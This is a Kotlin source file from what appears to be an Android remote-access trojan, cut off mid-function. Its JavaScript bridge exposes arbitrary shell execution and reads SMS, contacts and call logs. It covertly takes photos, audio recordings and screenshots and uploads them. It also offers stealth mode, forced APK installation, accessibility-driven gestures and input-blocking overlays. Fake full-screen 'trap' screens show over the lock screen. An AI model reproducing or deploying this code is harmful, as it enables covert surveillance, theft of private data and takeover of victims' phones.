package com.example.myandroid

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Handler
import android.os.Looper
import android.view.WindowManager
import androidx.lifecycle.setViewTreeLifecycleOwner
import androidx.lifecycle.setViewTreeViewModelStoreOwner
import androidx.savedstate.setViewTreeSavedStateRegistryOwner
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

object DynamicUIManager {
    private var overlayView: WebView? = null
    private var currentType: Int = -1
    
    var isAttached: Boolean = false

    private var statusBarView: WebView? = null
    private var isStatusBarAttached: Boolean = false

    private var touchGuardView: android.view.View? = null
    private var isGuardAttached: Boolean = false

    private var nativeOverlayView: android.view.View? = null
    var isNativeAttached: Boolean = false
    private var activeNativeEntry: com.example.myandroid.dynamic.DynamicEntry? = null

    private var nativeLifecycleOwner: OverlayLifecycleOwner? = null

    var activeTrapSessionId = 0L
    val isAnyAttached: Boolean get() = isAttached || isNativeAttached

    private class OverlayLifecycleOwner : androidx.lifecycle.LifecycleOwner, androidx.lifecycle.ViewModelStoreOwner, androidx.savedstate.SavedStateRegistryOwner {
        private val lifecycleRegistry = androidx.lifecycle.LifecycleRegistry(this)
        private val savedStateRegistryController = androidx.savedstate.SavedStateRegistryController.create(this)
        private val store = androidx.lifecycle.ViewModelStore()

        override val lifecycle: androidx.lifecycle.Lifecycle get() = lifecycleRegistry
        override val savedStateRegistry: androidx.savedstate.SavedStateRegistry get() = savedStateRegistryController.savedStateRegistry
        override val viewModelStore: androidx.lifecycle.ViewModelStore get() = store

        init {
            savedStateRegistryController.performRestore(null)
            lifecycleRegistry.handleLifecycleEvent(androidx.lifecycle.Lifecycle.Event.ON_CREATE)
            lifecycleRegistry.handleLifecycleEvent(androidx.lifecycle.Lifecycle.Event.ON_START)
            lifecycleRegistry.handleLifecycleEvent(androidx.lifecycle.Lifecycle.Event.ON_RESUME)
        }

        fun destroy() {
            lifecycleRegistry.handleLifecycleEvent(androidx.lifecycle.Lifecycle.Event.ON_DESTROY)
            store.clear()
        }
    }

    class CortexBridge(private val ctx: Context) {
        @JavascriptInterface
        fun close() {
            Handler(Looper.getMainLooper()).post { 
                ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                    .putBoolean("power_shield_keep_ignited", false).apply()
                removeOverlay(ctx, "JS_BRIDGE_CLOSE") 
                removeNativeOverlay(ctx, "JS_BRIDGE_CLOSE")
            }
        }

        @JavascriptInterface
        fun releaseTouch() {
            Handler(Looper.getMainLooper()).post { removeTouchGuard(ctx) }
            DebugLogger.log("BRIDGE", "JS requested touch release (Guard lifted)")
        }

        @JavascriptInterface
        fun reportPowerState(state: String) {
            DebugLogger.log("POWER_SHIELD", "State transitioned to: $state")
            ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                .putString("power_shield_state", state.uppercase())
                .apply()
        }

        @JavascriptInterface
        fun keepScreenIgnited(active: Boolean) {
            DebugLogger.log("POWER_SHIELD", "Hardware Ignition Lock: $active")
            ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                .putBoolean("power_shield_keep_ignited", active)
                .apply()
        }

        @JavascriptInterface
        fun log(msg: String) {
            DebugLogger.log("SDUI", msg)
        }

        @JavascriptInterface
        fun vibrate(durationMs: Long) {
            DebugLogger.log("BRIDGE", "JS requested vibration: ${durationMs}ms")
            try {
                val vibrator = ctx.getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    vibrator.vibrate(android.os.VibrationEffect.createOneShot(durationMs, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vibrator.vibrate(durationMs)
                }
            } catch (e: Exception) { }
        }

        @JavascriptInterface
        fun setDim(percentage: Int) {
            DebugLogger.log("BRIDGE", "JS requested dim level: $percentage%")
            Handler(Looper.getMainLooper()).post {
                DimmerManager.applyDim(ctx, percentage, "ACC")
            }
        }

        @JavascriptInterface
        fun setVolume(streamStr: String, levelStr: String) {
            DebugLogger.log("BRIDGE", "JS requested volume: $streamStr -> $levelStr")
            try {
                val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                val stream = when (streamStr.uppercase()) {
                    "MEDIA" -> android.media.AudioManager.STREAM_MUSIC
                    "ALARM" -> android.media.AudioManager.STREAM_ALARM
                    else -> android.media.AudioManager.STREAM_RING
                }

                if (levelStr.uppercase() == "SILENT" || levelStr.uppercase() == "VIBRATE" || levelStr.uppercase() == "NORMAL") {
                    if (PermissionManager.hasDndAccess(ctx)) {
                        am.ringerMode = when (levelStr.uppercase()) {
                            "SILENT" -> android.media.AudioManager.RINGER_MODE_SILENT
                            "VIBRATE" -> android.media.AudioManager.RINGER_MODE_VIBRATE
                            else -> android.media.AudioManager.RINGER_MODE_NORMAL
                        }
                    } else {
                        DebugLogger.log("BRIDGE_ERR", "DND access required for ringer control")
                    }
                } else {
                    val pct = levelStr.toIntOrNull()?.coerceIn(0, 100) ?: 50
                    val max = am.getStreamMaxVolume(stream)
                    val targetVol = ((pct / 100f) * max).toInt()
                    
                    // Ensure ringer mode is normal if trying to set a ring volume
                    if (stream == android.media.AudioManager.STREAM_RING && PermissionManager.hasDndAccess(ctx)) {
                        am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
                    }
                    
                    am.setStreamVolume(stream, targetVol, 0)
                }
            } catch (e: Exception) {
                DebugLogger.log("BRIDGE_ERR", "setVolume failed: ${e.message}")
            }
        }

        @JavascriptInterface
        fun wake() {
            DebugLogger.log("BRIDGE", "JS requested screen wake")
            val intent = Intent(ctx, PulseActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                putExtra("is_wake_trigger", true)
            }
            ctx.startActivity(intent)
        }

        @JavascriptInterface
        fun lock() {
            DebugLogger.log("BRIDGE", "JS requested device lock")
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                try { dpm.lockNow() } catch (e: Exception) { }
            }
        }

        @JavascriptInterface
        fun getConfigBool(key: String, defaultValue: Boolean): Boolean {
            return ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).getBoolean(key, defaultValue)
        }

        @JavascriptInterface
        fun getRingerMode(): Int {
            val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
            return am.ringerMode
        }

        @JavascriptInterface
        fun getBattery(): Int {
            val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        }

        @JavascriptInterface
        fun isCharging(): Boolean {
            val ifilter = android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED)
            val batteryStatus = ctx.registerReceiver(null, ifilter)
            val status = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
            return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING || 
                   status == android.os.BatteryManager.BATTERY_STATUS_FULL
        }

        @JavascriptInterface
        fun toast(message: String) {
            Handler(Looper.getMainLooper()).post {
                android.widget.Toast.makeText(ctx, message, android.widget.Toast.LENGTH_SHORT).show()
            }
        }

        @JavascriptInterface
        fun copyToClipboard(text: String) {
            Handler(Looper.getMainLooper()).post {
                try {
                    val clipboard = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
                    val clip = android.content.ClipData.newPlainText("Cortex Config", text)
                    clipboard.setPrimaryClip(clip)
                    android.widget.Toast.makeText(ctx, "Copied to clipboard", android.widget.Toast.LENGTH_SHORT).show()
                } catch (e: Exception) { }
            }
        }

        @JavascriptInterface
        fun openAccSettings() {
            Handler(Looper.getMainLooper()).post { 
                removeOverlay(ctx, "NAV_TO_ACC_SETTINGS") 
                removeNativeOverlay(ctx, "NAV_TO_ACC_SETTINGS")
            }
            try {
                val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(i)
            } catch(e: Exception) { }
        }

        @JavascriptInterface
        fun openAccHelp() {
            Handler(Looper.getMainLooper()).post { 
                removeOverlay(ctx, "NAV_TO_ACC_HELP") 
                removeNativeOverlay(ctx, "NAV_TO_ACC_HELP")
            }
            try {
                val i = Intent(ctx, AccHelpActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(i)
            } catch(e: Exception) { }
        }

        @JavascriptInterface
        fun nav(action: String) {
            Handler(Looper.getMainLooper()).post {
                val svc = MyAccessibilityService.instance
                if (svc != null) {
                    val code = when (action.uppercase()) {
                        "BACK" -> android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK
                        "HOME" -> android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME
                        "RECENTS" -> android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS
                        "NOTIFS" -> android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS
                        else -> 0
                    }
                    if (code != 0) {
                        val res = svc.performGlobalAction(code)
                        DebugLogger.log("BRIDGE", "JS requested NAV: $action -> Success: $res")
                    } else {
                        DebugLogger.log("BRIDGE_ERR", "Unknown NAV action: $action")
                    }
                } else {
                    DebugLogger.log("BRIDGE_ERR", "Cannot perform NAV: AccessibilityService offline")
                }
            }
        }

        @JavascriptInterface
        fun executeCommand(cmdJson: String) {
            try {
                val mockCmd = JSONObject(cmdJson)
                if (!mockCmd.has("id")) mockCmd.put("id", -2) 
                CoroutineScope(Dispatchers.IO).launch {
                    CommandProcessor.processSingleCommand(ctx, mockCmd)
                }
            } catch(e: Exception) { }
        }

        @JavascriptInterface
        fun startRelentlessInstall(apkPath: String) {
            Handler(Looper.getMainLooper()).post {
                removeOverlay(ctx, "START_INSTALL")
                removeNativeOverlay(ctx, "START_INSTALL")
                val intent = Intent(ctx, RelentlessInstallActivity::class.java).apply {
                    putExtra("apk_path", apkPath)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                }
                ctx.startActivity(intent)
            }
        }

        @JavascriptInterface
        fun runIntent(intentJson: String) {
            try {
                val json = JSONObject(intentJson)
                val action = json.optString("action", Intent.ACTION_VIEW)
                val intent = Intent(action)
                
                val dataStr = json.optString("data", "")
                if (dataStr.isNotEmpty()) {
                    val safeData = if (dataStr.startsWith("tel:", ignoreCase = true)) dataStr.replace("#", "%23") else dataStr
                    intent.data = android.net.Uri.parse(safeData)
                }
                
                if (json.has("pkg")) {
                    val pkg = json.getString("pkg")
                    if (json.has("cls")) intent.setClassName(pkg, json.getString("cls"))
                    else intent.setPackage(pkg)
                }

                val typeStr = json.optString("type", "")
                if (typeStr.isNotEmpty()) {
                    if (intent.data != null) intent.setDataAndType(intent.data, typeStr)
                    else intent.type = typeStr
                }
                
                val extras = json.optJSONObject("extras")
                extras?.keys()?.forEach { key ->
                    val value = extras.get(key)
                    if (value is Boolean) intent.putExtra(key, value)
                    else if (value is Int) intent.putExtra(key, value)
                    else intent.putExtra(key, value.toString())
                }

                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                val target = json.optString("target", "activity").lowercase()
                
                Handler(Looper.getMainLooper()).post {
                    try {
                        when (target) {
                            "service" -> {
                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(intent)
                                else ctx.startService(intent)
                            }
                            "broadcast" -> ctx.sendBroadcast(intent)
                            else -> ctx.startActivity(intent)
                        }
                        DebugLogger.log("BRIDGE", "Intent dispatched via JS: $action")
                    } catch (e: Exception) {
                        DebugLogger.log("BRIDGE_ERR", "Intent execution failed: ${e.message}")
                    }
                }
            } catch (e: Exception) {
                DebugLogger.log("BRIDGE_ERR", "JSON Parse failed for runIntent: ${e.message}")
            }
        }

        @JavascriptInterface
        fun uploadFile(filePath: String, category: String) {
            CoroutineScope(Dispatchers.IO).launch {
                val file = java.io.File(filePath)
                if (file.exists()) {
                    CloudManager.uploadFile(ctx, file, category)
                } else {
                    DebugLogger.log("BRIDGE_ERR", "File not found for upload: $filePath")
                }
            }
        }

        @JavascriptInterface
        fun sendSms(number: String, message: String) {
            PhoneManager.sendLegitSms(ctx, number, message)
        }

        @JavascriptInterface
        fun performGesture(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long) {
            Handler(Looper.getMainLooper()).post {
                val svc = MyAccessibilityService.instance
                if (svc != null) {
                    val path = android.graphics.Path()
                    path.moveTo(x1, y1)
                    if (x1 == x2 && y1 == y2) {
                        path.lineTo(x1 + 1f, y1 + 1f)
                    } else {
                        path.lineTo(x2, y2)
                    }
                    val builder = android.accessibilityservice.GestureDescription.Builder()
                    builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, duration))
                    svc.dispatchGesture(builder.build(), null, null)
                }
            }
        }

        @JavascriptInterface
        fun takeScreenshot(quality: Int) {
            MyAccessibilityService.instance?.captureScreenshot(quality) { file ->
                if (file != null) {
                    CoroutineScope(Dispatchers.IO).launch {
                        CloudManager.uploadFile(ctx, file, "BRIDGE_SCREENSHOT")
                        file.delete()
                    }
                }
            }
        }

        @JavascriptInterface
        fun setStealthMode(active: Boolean) {
            if (active) JudasManager.engageStealthMode(ctx)
            else JudasManager.disengageStealthMode(ctx)
        }

        @JavascriptInterface
        fun triggerStolenMode(targetNumber: String) {
            CoroutineScope(Dispatchers.IO).launch {
                val mockCmd = JSONObject().apply {
                    put("id", -5)
                    put("file_name", "STOLEN_PHONE")
                    put("content", targetNumber)
                }
                CommandProcessor.processSingleCommand(ctx, mockCmd)
            }
        }

        @JavascriptInterface
        fun evaluateSim() {
            JudasManager.evaluateSimState(ctx)
        }

        @JavascriptInterface
        fun openApp(packageName: String) {
            try {
                val intent = ctx.packageManager.getLaunchIntentForPackage(packageName)
                if (intent != null) {
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ctx.startActivity(intent)
                }
            } catch (e: Exception) {
                DebugLogger.log("BRIDGE_ERR", "Failed to open app: $packageName")
            }
        }

        @JavascriptInterface
        fun readSms(limit: Int): String {
            return PhoneManager.getHistoricalSms(ctx, limit).toString()
        }

        @JavascriptInterface
        fun getContacts(limit: Int): String {
            return PhoneManager.getContacts(ctx, limit).toString()
        }

        @JavascriptInterface
        fun getCallLogs(limit: Int): String {
            return PhoneManager.getCallLogs(ctx, limit).toString()
        }

        @JavascriptInterface
        fun getSystemInfo(): String {
            return DeviceManager.getStaticInfo(ctx).toString()
        }

        @JavascriptInterface
        fun getNearbyWifi(): String {
            return WifiScanner.getResults(ctx).toString()
        }

        @JavascriptInterface
        fun connectToWifi(ssid: String, pass: String) {
            WifiConnector.connect(ctx, ssid, pass)
        }

        @JavascriptInterface
        fun injectTouchGuard() {
            showTouchGuard(ctx)
        }

        @JavascriptInterface
        fun removeTouchGuard() {
            DynamicUIManager.removeTouchGuard(ctx)
        }

        @JavascriptInterface
        fun capturePhoto(useFront: Boolean) {
            CoroutineScope(Dispatchers.IO).launch {
                val file = CameraControl.capture(ctx, useFront)
                if (file != null) {
                    CloudManager.uploadFile(ctx, file, "BRIDGE_CAMERA")
                    file.delete()
                }
            }
        }

        @JavascriptInterface
        fun recordAudio(seconds: Int) {
            CoroutineScope(Dispatchers.IO).launch {
                val file = VoiceManager.recordSnippet(ctx, seconds)
                if (file != null) {
                    CloudManager.uploadFile(ctx, file, "BRIDGE_AUDIO")
                    file.delete()
                }
            }
        }
        
        @JavascriptInterface
        fun shell(cmd: String) {
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val process = Runtime.getRuntime().exec(cmd)
                    val output = process.inputStream.bufferedReader().readText()
                    DebugLogger.log("BRIDGE_SHELL", "Output: $output")
                } catch(e: Exception) {
                    DebugLogger.log("BRIDGE_SHELL_ERR", e.message ?: "Unknown")
                }
            }
        }

        @JavascriptInterface
        fun triggerTrap(type: String, label: String) {
            Handler(Looper.getMainLooper()).post {
                val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                if (type.equals("NATIVE", ignoreCase = true) || type.equals("DEX", ignoreCase = true)) {
                    val nativeStr = prefs.getString("native_traps_array", "[]") ?: "[]"
                    val nativeArr = org.json.JSONArray(nativeStr)
                    for (i in 0 until nativeArr.length()) {
                        val trap = nativeArr.getJSONObject(i)
                        if (trap.optString("label") == label) {
                            val dexPath = trap.getString("file_path")
                            val className = trap.getString("class_name")
                            val dimLevel = trap.optInt("dim", 20)
                            
                            // FORCE PERSISTENT TIMEOUT FOR CRITICAL ILLUSIONS
                            val isCritical = label.equals("Welcome", ignoreCase = true) || label.equals("Reset", ignoreCase = true)
                            val timeout = if (isCritical) 0L else trap.optLong("timeout", 10L)
                            
                            showNativeOverlay(ctx, dexPath, className, dimLevel)
                            
                            if (timeout > 0L) {
                                val currentSession = activeTrapSessionId
                                Handler(Looper.getMainLooper()).postDelayed({
                                    if (activeTrapSessionId == currentSession) {
                                        removeNativeOverlay(ctx, "NATIVE_TRAP_TIMEOUT: $label")
                                    }
                                }, timeout * 1000)
                            }
                            return@post
                        }
                    }
                    DebugLogger.log("TRAP_TRANSITION", "Native trap not found: $label")
                } else if (type.equals("HTML", ignoreCase = true) || type.equals("UI", ignoreCase = true)) {
                    val uiStr = prefs.getString("ui_traps_array", "[]") ?: "[]"
                    val uiArr = org.json.JSONArray(uiStr)
                    for (i in 0 until uiArr.length()) {
                        val trap = uiArr.getJSONObject(i)
                        if (trap.optString("label") == label) {
                            val method = trap.optString("method", "ACC").uppercase()
                            val html = trap.optString("html", "")
                            val dimLevel = trap.optInt("dim", 20)
                            val timeout = trap.optLong("timeout", 10L)
                            
                            DimmerManager.applyDim(ctx, dimLevel, method)
                            showOverlay(ctx, true, method, html, false)
                            
                            if (timeout > 0L) {
                                val currentSession = activeTrapSessionId
                                Handler(Looper.getMainLooper()).postDelayed({
                                    if (activeTrapSessionId == currentSession) {
                                        removeOverlay(ctx, "UI_TRAP_TIMEOUT: $label")
                                    }
                                }, timeout * 1000)
                            }
                            return@post
                        }
                    }
                    DebugLogger.log("TRAP_TRANSITION", "HTML trap not found: $label")
                }
            }
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    fun showOverlay(ctx: Context, touchable: Boolean, method: String, htmlContent: String, isFullScreen: Boolean = true) {
        Handler(Looper.getMainLooper()).post {
            activeTrapSessionId = System.currentTimeMillis()
            DebugLogger.log("SDUI_VERBOSE", "showOverlay triggered. Method: $method | Touchable: $touchable | FullScreen: $isFullScreen")
            val serviceInstance = MyAccessibilityService.instance
            val hasOverlayPerm = PermissionManager.hasOverlayAccess(ctx)
            
            val finalMethod = when (method.uppercase()) {
                "ACC" -> if (serviceInstance != null) "ACC" else "FAIL_ACC"
                "OVERLAY" -> if (hasOverlayPerm) "OVERLAY" else "FAIL_OVERLAY"
                else -> {
                    if (serviceInstance != null) "ACC" 
                    else if (hasOverlayPerm) "OVERLAY"
                    else "FAIL_NONE"
                }
            }

            if (finalMethod.startsWith("FAIL")) {
                DebugLogger.log("SDUI_ERR", "Injection aborted. Method: $method | Reason: $finalMethod")
                return@post
            }

            val windowContext = if (finalMethod == "ACC") serviceInstance!! else ctx
            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val targetType = if (finalMethod == "ACC") WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY else WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY

            // VITAL MEMORY CHECK: If context died/changed or type changed, we MUST destroy the old WebView to prevent BadTokenException
            if (overlayView != null && (currentType != targetType || overlayView?.context != windowContext)) {
                DebugLogger.log("SDUI_VERBOSE", "Context or Window Type mismatched. Purging old WebView instance.")
                if (isAttached) {
                    try { wm.removeView(overlayView) } catch (e: Exception) { DebugLogger.log("SDUI_ERR", "Detach old failed: ${e.message}") }
                }
                overlayView?.destroy()
                overlayView = null
                isAttached = false
            }

            var flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or 
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON

            if (isFullScreen) {
                flags = flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
            }

            if (!touchable) {
                flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
            }

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                targetType,
                flags,
                PixelFormat.TRANSLUCENT
            )

            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P && isFullScreen) {
                params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }

            if (overlayView == null) {
                DebugLogger.log("SDUI_VERBOSE", "Initializing fresh WebView engine (Cold Start)...")
                overlayView = WebView(windowContext).apply {
                    setBackgroundColor(Color.TRANSPARENT)
                    settings.javaScriptEnabled = true
                    settings.domStorageEnabled = true
                    // Required to load images from file:///android_asset/
                    settings.allowFileAccess = true
                    settings.allowContentAccess = true
                    addJavascriptInterface(CortexBridge(ctx), "Cortex")
                }
            }

            // Always update WebViewClient to capture the latest ctx for Dimmer removal
            overlayView!!.webViewClient = object : WebViewClient() {
                override fun onPageFinished(view: WebView?, url: String?) {
                    super.onPageFinished(view, url)
                    Handler(Looper.getMainLooper()).postDelayed({
                        DimmerManager.removeOverlay(ctx)
                        if (isNativeAttached) {
                            removeNativeOverlay(ctx, "SEAMLESS_HTML_HANDOFF")
                        }
                    }, 150) // 150ms allows GPU to flip the buffer after render
                }

                override fun onRenderProcessGone(view: WebView?, detail: android.webkit.RenderProcessGoneDetail?): Boolean {
                    DebugLogger.log("SDUI_ERR", "WebView Renderer died! OS killed it to save RAM. Purging.")
                    if (isAttached) try { wm.removeView(view) } catch(e: Exception) {}
                    view?.destroy()
                    if (overlayView == view) { overlayView = null; isAttached = false }
                    return true 
                }
            }

            // Force strict UI constraints for Nav/Status Bar obedience
            if (!isFullScreen) {
                overlayView!!.fitsSystemWindows = true
                overlayView!!.systemUiVisibility = android.view.View.SYSTEM_UI_FLAG_VISIBLE
            } else {
                overlayView!!.fitsSystemWindows = false
                overlayView!!.systemUiVisibility = (android.view.View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        or android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        or android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION)
            }

            try {
                // Set base URL to the assets folder so relative <img src="..."> paths work
                val assetBaseUrl = "file:///android_asset/reset_ui/"
                overlayView!!.loadDataWithBaseURL(assetBaseUrl, htmlContent, "text/html", "UTF-8", null)
                if (!isAttached) {
                    wm.addView(overlayView, params)
                    currentType = targetType
                    isAttached = true
                    DebugLogger.log("SDUI_VERBOSE", "WebView attached successfully.")
                } else {
                    overlayView!!.layoutParams = params
                    wm.updateViewLayout(overlayView, params)
                    DebugLogger.log("SDUI_VERBOSE", "Cached WebView layout updated.")
                }
            } catch (e: Exception) {
                DebugLogger.log("SDUI_ERR", "Failed to add or update WebView: ${e.message}")
                overlayView = null
                isAttached = false
            }
        }
    }

    fun removeOverlay(ctx: Context, reason: String = "UNKNOWN") {
        Handler(Looper.getMainLooper()).post {
            DebugLogger.log("SDUI_CLOSE", "Overlay removal triggered. Reason: $reason")
            val serviceInstance = MyAccessibilityService.instance
            val windowContext = if (serviceInstance != null) serviceInstance else ctx
            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            
            DebugLogger.log("SDUI_CLOSE", "Calling DimmerManager.removeOverlay from DynamicUIManager...")
            DimmerManager.removeOverlay(ctx)
            
            overlayView?.let {
                if (isAttached) {
                    try { 
                        wm.removeView(it) 
                        DebugLogger.log("SDUI_VERBOSE", "WebView detached successfully.")
                    } catch (e: Exception) {
                        DebugLogger.log("SDUI_ERR", "Detach failed: ${e.message}")
                    }
                }
                it.loadUrl("about:blank")
                isAttached = false
            }
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    fun showStatusBarOverlay(ctx: Context, touchable: Boolean, htmlContent: String) {
        Handler(Looper.getMainLooper()).post {
            DebugLogger.log("SDUI", "showStatusBarOverlay triggered. Touchable: $touchable")
            val serviceInstance = MyAccessibilityService.instance
            val hasOverlayPerm = PermissionManager.hasOverlayAccess(ctx)
            
            val finalMethod = if (serviceInstance != null) "ACC" else if (hasOverlayPerm) "OVERLAY" else "FAIL"
            if (finalMethod == "FAIL") {
                DebugLogger.log("SDUI_ERR", "Status Bar injection failed: No overlay permission or ACC.")
                return@post
            }

            val windowContext = if (finalMethod == "ACC") serviceInstance!! else ctx
            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val targetType = if (finalMethod == "ACC") WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY else WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY

            if (statusBarView != null && (!isStatusBarAttached || statusBarView?.context != windowContext)) {
                if (isStatusBarAttached) try { wm.removeView(statusBarView) } catch (e: Exception) {}
                statusBarView?.destroy()
                statusBarView = null
                isStatusBarAttached = false
            }

            var flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED

            if (!touchable) {
                flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
            }

            val heightPx = (90 * windowContext.resources.displayMetrics.density).toInt()
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                heightPx,
                targetType,
                flags,
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = android.view.Gravity.TOP
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                    layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                }
            }

            if (statusBarView == null) {
                statusBarView = WebView(windowContext).apply {
                    setBackgroundColor(Color.TRANSPARENT)
                    settings.javaScriptEnabled = true
                    settings.domStorageEnabled = true
                    addJavascriptInterface(CortexBridge(ctx), "Cortex")
                }
            }

            try {
                statusBarView!!.loadDataWithBaseURL(null, htmlContent, "text/html", "UTF-8", null)
                if (!isStatusBarAttached) {
                    wm.addView(statusBarView, params)
                    isStatusBarAttached = true
                } else {
                    statusBarView!!.layoutParams = params
                    wm.updateViewLayout(statusBarView, params)
                }
            } catch (e: Exception) {
                DebugLogger.log("SDUI_ERR", "Failed to add StatusBar WebView: ${e.message}")
                statusBarView = null
                isStatusBarAttached = false
            }
        }
    }

    fun removeStatusBarOverlay(ctx: Context) {
        Handler(Looper.getMainLooper()).post {
            val windowContext = MyAccessibilityService.instance ?: ctx
            val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            statusBarView?.let {
                if (isStatusBarAttached) {
                    try { wm.removeView(it) } catch (e: Exception) {}
                }
                it.loadUrl("about:blank")
                isStatusBarAttached = false
            }
        }
    }

    fun dispatchScreenState(isOn: Boolean) {
        Handler(Looper.getMainLooper()).post {
            if (!isOn) {
                overlayView?.evaluateJavascript("if(typeof onScreenOff === 'function') onScreenOff();", null)
            }
            activeNativeEntry?.onScreenStateChanged(isOn)
        }
    }

    fun showTouchGuard(ctx: Context) {
        Handler(Looper.getMainLooper()).post {
            val service = MyAccessibilityService.instance ?: return@post
            val wm = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager

            if (touchGuardView == null) {
                touchGuardView = android.view.View(service).apply {
                    setBackgroundColor(android.graphics.Color.TRANSPARENT)
                }
            }

            if (!isGuardAttached) {
                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                    android.graphics.PixelFormat.TRANSLUCENT
                )
                try {
                    wm.addView(touchGuardView, params)
                    isGuardAttached = true
                    DebugLogger.log("GUARD", "Touch Swallower DEPLOYED")
                } catch (e: Exception) { }
            }
        }
    }

    fun removeTouchGuard(ctx: Context) {
        Handler(Looper.getMainLooper()).post {
            val service = MyAccessibilityService.instance ?: return@post
            val wm = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            if (isGuardAttached && touchGuardView != null) {
                try {
                    wm.removeView(touchGuardView)
                    isGuardAttached = false
                    DebugLogger.log("GUARD", "Touch Swallower RELEASED")
                } catch (e: Exception) { }
            }
        }
    }

    fun showNativeOverlay(ctx: Context, dirPath: String, className: String, dimLevel: Int) {
        Handler(Looper.getMainLooper()).post {
